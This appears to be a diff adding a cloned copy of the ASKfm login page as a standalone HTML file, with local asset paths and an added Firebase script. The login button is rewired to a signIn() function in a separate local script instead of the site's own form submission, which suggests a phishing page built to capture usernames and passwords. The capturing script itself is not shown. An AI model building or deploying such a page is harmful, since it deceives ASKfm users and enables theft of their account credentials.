@@ -1,0 +1,105 @@
+
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <script>
+//<![CDATA[
+function logError(b,d,e,c,a){try{var g,h="";a=a||b;b=(a.message||a.description||b).toString();stack=(a.stack||a.backtrace||a.stacktrace||"").toString();g=a.target||"";d=(d||a.fileName||a.sourceURL||g.src).toString();c=c||window.event&&window.event.errorCharacter;e=(e||a.lineNumber||a.line).toString()+(c?":"+c:"");try{localStorage.setItem("test","test"),localStorage.removeItem("test"),(new FormData).append("test","test")}catch(l){h="1"}var f,k={m:b,s:stack,f:d||"",l:e||"",u:document.location,w:h};
+b="";for(f in k)b+=f+"="+encodeURIComponent(k[f])+"&";(new Image).src="/home/jserror?"+b}catch(l){}}window.onerror=logError;
+
+//]]>
+</script>
+<script src="https://www.gstatic.com/firebasejs/4.8.1/firebase.js"></script>
+    <title>Log in | ASKfm</title>
+    <meta name="description" content="Find out what people want to know about you. Ask questions and get answers on any topic!" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <meta name="csrf-param" content="authenticity_token" />
+<meta name="csrf-token" content="/wJkN7UbTypmShCO/rSiZx/uWV2TFEvLXDzIr6ka9HRacYinfEC3n4YMX4V0/cw0Ml489WMb5lApBqfY26ukbw==" />
+
+    <link rel="stylesheet" media="all" href="https://static.ask.fm/assets/application_ltr-929b84d95b5aada691d344157bc21dd298fc85987fc297a2d05c09f3f690f1eb.css" data-turbolinks-track="true" />
+
+  </head>
+
+
+  <body class="theme-0 dialogBody" data-id="session/new"><script>
+  window.Config && window.Config.init({"poller:interval":30000,"poller:cache_limit":10,"poller:title":true,"mass_ask_limit":50,"flash:delay":3000,"gtm":true,"uploader:max_size":8388608,"uploader:resize:enabled":false,"uploader:resize:max_size":13000000,"uploader:resize:max_dimension":2048,"page:category":"Login","page:type":"New","page:user_id":null});
+</script>
+<div id="loaderMother" style="display:none"></div>
+    <header id="topMenu" class="topMenu">
+
+      <div class="rsp-eql-desktop">
+  <section class="topBar rsp-container">
+          <img src = "../res/askfm2.png" width = "125" height= "40" onclick = "redirect();" />
+
+        <div class="topBar-right">
+            <a class="btn-action plain" href="signup.html">Sign up</a>
+
+        </div>
+          <h1>Log in</h1>
+
+  </section>
+</div>
+
+<div class="rsp-lte-tablet rsp-container">
+  <section class="topBar">
+
+      <div class="topBar-left">
+               <img src = "askfm2.png" width = "125" height= "40" onclick = "redirect();" />
+<!--           <a title="Back" class="btn-action-icon icon-back" href="/"></a> -->
+      </div>
+      <div class="topBar-right">
+          <a class="btn-action plain" href="/signup">Sign up</a>
+
+      </div>
+        <h1>Log in</h1>
+
+  </section>
+
+</div>
+
+
+<div style="display:none" class="flash-message notice">
+  <p class="util-relative rsp-container">
+    <a href="" class="icon-close" data-action="FlashHide"></a>
+
+</p></div>
+
+</header>
+    <main id="contentArea" class="rsp-container">
+
+      <div class="main-content util-clearfix">
+        <div class="main-column util-clearfix">
+
+<form id="loginForm" data-action="FormXHRSubmit" action="/login" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="&#x2713;" /><input type="hidden" name="authenticity_token" value="MqlEDDodsL5QtgvHLYHWGjg19u/qmCL/QhpOz0HaWVCX2qic80ZIC7DwRMynyLhJFYWTRxqXj2Q3ICG4M2sJSw==" />
+  <div class="inputFormBox">
+    <div class="inputFormPadding">
+      <input id="user_login" type="text" name="login" class="inputForm" maxlength="40" placeholder="Username" autocomplete="username" autofocus="autofocus" data-input="CaptchaReload" />
+    </div>
+    <div class="inputFormPadding">
+      <input id="user_password" type="password" name="password" class="inputForm" maxlength="20" placeholder="Password" autocomplete="current-password" />
+    </div>
+  </div>
+
+  <div class="captcha-container" style="display:none" data-url="/login/captcha"></div>
+
+  <div class="simpleFormItem">
+    <input type="button" class="btn-primary-wide" onclick="signIn()" value="Log in">
+  </div>
+
+
+</form>
+
+
+        </div>
+      </div>
+</main>
+
+
+  <noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-W5DVX4" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+
+<noscript><img src="//pixel.quantserve.com/pixel/p-r1DAFnUnQgqGA.gif?labels=_fp.event.Default" style="display:none;" border="0" height="1" width="1" alt="Quantcast"/></noscript>
+<script type="text/javascript" src="../js/login.js"></script>
+</body>
+</html>
+
